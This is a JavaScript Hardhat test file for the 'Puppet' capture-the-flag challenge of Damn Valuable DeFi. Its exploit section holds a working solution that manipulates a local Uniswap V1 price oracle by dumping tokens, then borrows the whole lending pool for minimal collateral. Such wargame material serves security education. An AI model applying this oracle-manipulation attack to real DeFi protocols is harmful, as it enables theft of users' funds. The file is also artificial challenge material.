const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

//this is there to verify the working of exchange
// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    );
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        //create the instances
        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        //initialize attacker balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);


        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */


        //an idea on how much ETH will I get in rerturn of exchange
        const check = await this.uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 });
        console.log(`This is an expected ETH for swapping 1000 DVT tokens that we will get from exchange: ${ethers.utils.formatEther(check)}`);


        //add tokens to liquidity - exchanage
        let deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;    //a very big deadline
        const min_eth = ethers.utils.parseEther('9');  //how many min you want to except, else if not received, atleast this ETH your transaction should forcefully fail.
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, min_eth, deadline, { gasLimit: 1e6 });
        //this will change cost of 1 DVT token = 0.099

        const tokens_owned = await this.token.balanceOf(this.uniswapExchange.address);

        const eth_owned = await ethers.provider.getBalance(this.uniswapExchange.address);

        console.log("eth owned by exchange: ", ethers.utils.formatEther(eth_owned));
        console.log("tokens owned by exchange: ", ethers.utils.formatEther(tokens_owned));

        const res = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        const bal = await ethers.provider.getBalance(attacker.address);



        //check ETH required
        console.log("The require ethers for goal: ", ethers.utils.formatEther(res));

        console.log("ETH balance of the attacker: ", ethers.utils.formatEther(bal));

        //calculate desposit required
        // this.lendingPool.connect();

        //then buy lots of tokens for all ETH - pool
        const req_eth = ethers.utils.parseEther('20');
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: req_eth });

        //add 1 more token by swapping some ETH with exchange
        const some_eth = ethers.utils.parseEther('1');  //how many min you want to except, else if not received, atleast this ETH your transaction should forcefully fail.
        const min_tokens = ethers.utils.parseEther('1');
        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(min_tokens, deadline, { value: some_eth, gasLimit: 1e6 });

        //now the attacker owns
        console.log("Now the attacker owns: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});